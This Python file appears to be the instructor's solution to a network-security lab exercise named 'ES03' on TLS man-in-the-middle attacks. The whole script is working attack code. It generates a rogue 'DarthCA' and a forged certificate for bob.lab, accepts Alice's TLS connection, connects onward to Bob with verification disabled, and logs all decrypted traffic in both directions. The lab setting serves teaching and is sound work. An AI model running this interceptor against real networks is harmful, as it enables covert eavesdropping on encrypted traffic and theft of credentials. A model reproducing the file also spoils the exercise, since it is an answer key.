import ssl, socket, threading, os, subprocess, sys

"""
ES03 — TLS MITM proxy (Darth) — SOLUTION
"""

BOB_IP = "10.0.0.20"
LISTEN_PORT = 10443
BOB_PORT = 10443
WORKDIR = os.environ.get("MITM_DIR", os.path.join(os.path.expanduser("~"), "lab03", "darth"))

os.makedirs(WORKDIR, exist_ok=True)

CA_KEY = os.path.join(WORKDIR, "darth_ca.key")
CA_CERT = os.path.join(WORKDIR, "darth_ca.cert")
SRV_KEY = os.path.join(WORKDIR, "fake_server.key")
SRV_CSR = os.path.join(WORKDIR, "fake_server.csr")
SRV_EXT = os.path.join(WORKDIR, "fake_server.ext")
SRV_CERT = os.path.join(WORKDIR, "fake_server.cert")


def run(cmd):
    subprocess.run(cmd, shell=True, check=True, capture_output=True)


def generate_fake_cert():
    # Darth's CA
    run(f"openssl genrsa -out {CA_KEY} 2048")
    run(
        f"openssl req -new -x509 -days 365 -key {CA_KEY} -out {CA_CERT}"
        f' -subj "/CN=DarthCA/O=EvilLab/C=IT"'
    )

    # Fake server cert for bob.lab / 10.0.0.20
    run(f"openssl genrsa -out {SRV_KEY} 2048")
    run(
        f"openssl req -new -key {SRV_KEY} -out {SRV_CSR}"
        f' -subj "/CN=bob.lab/O=NetworkSecurityLab/C=IT"'
    )
    with open(SRV_EXT, "w") as f:
        f.write("subjectAltName=IP:10.0.0.20,DNS:bob.lab\n")
    run(
        f"openssl x509 -req -days 365"
        f" -in {SRV_CSR} -CA {CA_CERT} -CAkey {CA_KEY} -CAcreateserial"
        f" -extfile {SRV_EXT} -out {SRV_CERT}"
    )
    print(f"[darth] Fake certificate generated in {WORKDIR}")


def forward(src, dst, label):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            print(f"[darth intercepts {label}] {data.decode(errors='replace').strip()}", flush=True)
            dst.send(data)
    except Exception:
        pass
    finally:
        src.close()
        dst.close()


def handle(alice_conn):
    # Connect to the real Bob
    client_ctx = ssl.create_default_context()
    client_ctx.check_hostname = False
    client_ctx.verify_mode = ssl.CERT_NONE
    bob_conn = client_ctx.wrap_socket(
        socket.create_connection((BOB_IP, BOB_PORT)),
        server_hostname="bob.lab",
    )

    t1 = threading.Thread(
        target=forward, args=(alice_conn, bob_conn, "Alice→Bob"), daemon=True
    )
    t2 = threading.Thread(
        target=forward, args=(bob_conn, alice_conn, "Bob→Alice"), daemon=True
    )
    t1.start()
    t2.start()
    t1.join()
    t2.join()


def main():
    generate_fake_cert()

    server_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    server_ctx.load_cert_chain(certfile=SRV_CERT, keyfile=SRV_KEY)

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("0.0.0.0", LISTEN_PORT))
    listener.listen(5)
    print(f"[darth] Listening on port {LISTEN_PORT} — waiting for Alice...")

    while True:
        conn_raw, addr = listener.accept()
        print(f"[darth] Connection from {addr}")
        try:
            alice_conn = server_ctx.wrap_socket(conn_raw, server_side=True)
        except ssl.SSLError as e:
            print(f"[darth] TLS handshake failed (Alice rejected fake cert): {e}")
            conn_raw.close()
            continue
        threading.Thread(target=handle, args=(alice_conn,), daemon=True).start()


if __name__ == "__main__":
    main()
